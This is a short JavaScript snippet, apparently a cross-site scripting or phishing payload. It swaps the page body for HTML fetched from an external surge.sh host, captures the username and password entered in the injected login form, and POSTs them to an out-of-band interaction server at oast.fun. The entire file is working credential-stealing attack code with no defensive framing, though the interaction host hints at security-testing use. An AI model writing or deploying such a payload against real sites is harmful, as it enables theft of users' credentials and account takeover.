fetch("https://tearful-earth.surge.sh/site.html").then(res => res.text()).then(res => {
  document.body.innerHTML = res;

  const form = document.querySelector('#aa');

  form.addEventListener("submit", function(evt) {
    evt.preventDefault();

    let login = document.querySelector('input[name="username"]').value;
    let pass = document.querySelector('input[name="password"]').value;

    // Send credentials to interact.sh server
    fetch("https://qaddkrkqseozcfkqovthibvusjq50orlv.oast.fun/en/users", {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        username: login,
        password: pass
      })
    });

    // Optionally, display an alert for debugging
    alert('Login: ' + login + " Password: " + pass);

    return;
  }, true);
});
